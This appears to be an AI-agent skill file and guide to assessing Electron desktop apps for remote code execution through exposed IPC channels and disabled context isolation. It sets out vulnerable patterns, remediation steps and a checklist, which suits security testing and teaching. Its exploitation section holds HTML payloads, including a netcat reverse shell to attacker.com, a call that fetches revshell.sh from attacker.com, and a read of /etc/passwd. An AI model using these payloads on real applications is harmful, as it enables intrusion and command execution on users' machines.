---
name: electron-ipc-rce-exploitation
description: How to identify and exploit Electron app vulnerabilities when contextIsolation is disabled or preload scripts expose dangerous IPC endpoints. Use this skill whenever you're testing Electron desktop applications for security vulnerabilities, analyzing IPC communication patterns, investigating potential RCE vectors in Electron apps, or reviewing preload.js and main.js code for dangerous API exposure. Trigger this skill for any Electron security assessment, pentest, or code review involving IPC channels, context isolation, or renderer-to-main process communication.
---

# Electron contextIsolation RCE via IPC Exploitation

This skill helps you identify and exploit Remote Code Execution (RCE) vulnerabilities in Electron applications when `contextIsolation` is disabled or when preload scripts expose dangerous IPC endpoints to the renderer process.

## Understanding the Vulnerability

Electron apps have two main processes:
- **Main process**: Has full Node.js access, controls app lifecycle
- **Renderer process**: Runs the web UI, should be sandboxed

When `contextIsolation: false` or when preload scripts expose dangerous APIs, the renderer can communicate with the main process via IPC (Inter-Process Communication). If the main process handles these IPC events unsafely, RCE becomes possible.

## Detection Patterns

### 1. Check for contextIsolation Status

Look for these patterns in `main.js` or `app.js`:

```javascript
// VULNERABLE - contextIsolation disabled
BrowserWindow({
  webPreferences: {
    contextIsolation: false,
    nodeIntegration: true
  }
})

// SECURE - contextIsolation enabled
BrowserWindow({
  webPreferences: {
    contextIsolation: true,
    nodeIntegration: false,
    preload: path.join(__dirname, 'preload.js')
  }
})
```

### 2. Identify Dangerous IPC Exposure in preload.js

Look for patterns that expose main process APIs to the renderer:

```javascript
// DANGEROUS - exposes arbitrary IPC send
window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}

// DANGEROUS - exposes shell.openExternal
window.electronOpenInBrowser = (url) => {
  shell.openExternal(url)
}

// DANGEROUS - exposes full IPC communication
window.electronListen = (event, cb) => {
  ipcRenderer.on(event, cb)
}

window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```

### 3. Identify Dangerous IPC Handlers in main.js

Look for IPC handlers that execute code or download files:

```javascript
// DANGEROUS - downloads and executes arbitrary URLs
ipcMain.on("getUpdate", (event, url) => {
  mainWindow.webContents.downloadURL(url)
  // ... later executes the downloaded file
})

// DANGEROUS - executes shell commands
ipcMain.on("exec", (event, command) => {
  const { exec } = require('child_process')
  exec(command, (err, stdout) => {
    event.sender.send('result', stdout)
  })
})

// DANGEROUS - reads arbitrary files
ipcMain.on("readFile", (event, path) => {
  const fs = require('fs')
  event.sender.send('file-content', fs.readFileSync(path))
})
```

## Exploitation Techniques

### Technique 1: Direct IPC Exploitation

If preload exposes `electronSend` or similar:

```html
<script>
  // Trigger dangerous IPC event
  electronSend("getUpdate", "https://attacker.com/revshell.sh")
</script>
```

### Technique 2: XSS to RCE Chain

If the app has XSS and dangerous IPC:

```html
<script>
  // 1. Inject XSS payload
  // 2. Use exposed IPC to trigger RCE
  window.electronSend("exec", "nc attacker.com 4444 -e /bin/bash")
</script>
```

### Technique 3: shell.openExternal Abuse

If `shell.openExternal` is exposed:

```html
<script>
  // Use file:// protocol to open local files
  electronOpenInBrowser("file:///etc/passwd")
  
  // Or use custom protocols that may execute code
  electronOpenInBrowser("custom-protocol://malicious")
</script>
```

### Technique 4: Arbitrary Event Injection

If full IPC communication is exposed:

```html
<script>
  // Listen for responses
  electronListen('response', (data) => {
    console.log('Got response:', data)
  })
  
  // Send arbitrary events
  electronSend('any-event', 'any-data')
</script>
```

## Testing Workflow

### Step 1: Reconnaissance

1. **Extract the Electron app** (if you have the binary):
   ```bash
   # On Linux
   unzip -l app.asar
   
   # Or use electron-rebuild to extract
   ```

2. **Locate key files**:
   - `main.js` or `app.js` - main process entry point
   - `preload.js` - bridge between renderer and main
   - `package.json` - dependencies and scripts

3. **Search for IPC patterns**:
   ```bash
   grep -r "ipcMain.on" main.js
   grep -r "ipcRenderer.send" preload.js
   grep -r "contextIsolation" main.js
   ```

### Step 2: Identify Attack Surface

1. **List all IPC channels** exposed in preload.js
2. **Map each channel** to its handler in main.js
3. **Assess each handler** for dangerous operations:
   - File system access
   - Process execution
   - Network operations
   - Environment variable access

### Step 3: Exploit Development

1. **Create a test HTML file** with your exploit payload
2. **Inject it** into the renderer (via XSS, devtools, or file:// URL)
3. **Execute the IPC call** to trigger the vulnerability
4. **Capture the result** (file read, command output, etc.)

## Remediation Guidance

### For Developers

1. **Enable contextIsolation**:
   ```javascript
   webPreferences: {
     contextIsolation: true,
     nodeIntegration: false
   }
   ```

2. **Use contextBridge** for safe API exposure:
   ```javascript
   // preload.js
   const { contextBridge, ipcRenderer } = require('electron')
   
   contextBridge.exposeInMainWorld('electronAPI', {
     // Only expose specific, safe functions
     getUpdate: (url) => ipcRenderer.invoke('getUpdate', url)
   })
   ```

3. **Validate all IPC inputs** in main.js:
   ```javascript
   ipcMain.handle('getUpdate', (event, url) => {
     // Validate URL
     if (!url.startsWith('https://trusted-domain.com/')) {
       throw new Error('Invalid URL')
     }
     // ... safe handling
   })
   ```

4. **Use ipcRenderer.invoke** instead of send for request/response:
   ```javascript
   // More secure, synchronous-like pattern
   const result = await ipcRenderer.invoke('safe-channel', data)
   ```

## Real-World Examples

### Microsoft Teams Pwn2Own (2019)

- **Vulnerability**: XSS + IPC abuse
- **Impact**: $150,000 bounty, full RCE
- **Chain**: XSS → IPC → File download → Execution

### Common Patterns in Vulnerable Apps

1. **Update mechanisms** that download and execute
2. **File operations** without path validation
3. **Shell command execution** with user input
4. **Arbitrary IPC channels** exposed to renderer

## Security Checklist

- [ ] contextIsolation is enabled
- [ ] nodeIntegration is disabled
- [ ] Preload script uses contextBridge
- [ ] All IPC handlers validate inputs
- [ ] No arbitrary file operations exposed
- [ ] No shell command execution exposed
- [ ] IPC channels are minimal and specific
- [ ] Use ipcRenderer.invoke for request/response

## References

- [Electron Security Documentation](https://www.electronjs.org/docs/latest/tutorial/security)
- [Pwn2Own Microsoft Teams Slides](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)
- [Electron IPC Documentation](https://www.electronjs.org/docs/latest/api/ipc-main)

---

**Note**: This skill is for authorized security testing only. Always have proper authorization before testing Electron applications for vulnerabilities.
